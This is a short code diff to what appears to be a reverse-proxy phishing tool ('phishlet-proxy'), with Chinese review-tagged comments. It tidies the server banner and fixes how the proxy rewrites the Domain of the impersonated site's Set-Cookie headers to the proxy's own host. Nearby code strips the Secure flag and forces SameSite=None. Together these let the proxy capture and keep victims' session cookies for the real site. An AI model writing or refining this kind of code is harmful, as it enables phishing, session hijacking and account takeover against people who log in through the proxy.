@@ -81,6 +81,9 @@ def make_handler(phishlet, db_file):
         server_version = 'phishlet-proxy/1'
         sys_version = ''
 
+        def version_string(self):
+            return self.server_version  # CS74-N2: 消尾随空格(gateway 先例)
+
         def log(self, msg):
             print(f'[phishlet:{phishlet["name"]}] {msg}', flush=True)
 
@@ -166,7 +169,7 @@ def make_handler(phishlet, db_file):
             if any(k.lower() == 'set-cookie' for k in headers):  # CS73-F4: 门同大小写不敏感
                 raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS72-7: 大小写不敏感(同 ct)
                 if isinstance(raw, str):
-                    raw = re.sub(r'(?i)(domain=)' + re.escape(target_host.split(':')[0]), r'\g<1>' + proxy_host.split(':')[0], raw)  # CS73-F4/R32D90-F1: 大小写不敏感+剥端口(Domain 属性永不含端口)
+                    raw = re.sub(r'(?i)(domain=)' + re.escape(target_host.rpartition(':')[0] or target_host), r'\g<1>' + (proxy_host.rpartition(':')[0] or proxy_host), raw)  # CS73-F4/R32D90-F1/CS74-N4: rpartition(套内惯用形)
                     raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
                     raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
                     # R32D90-F1: 先删异大小写原键再设规范键——此前直赋
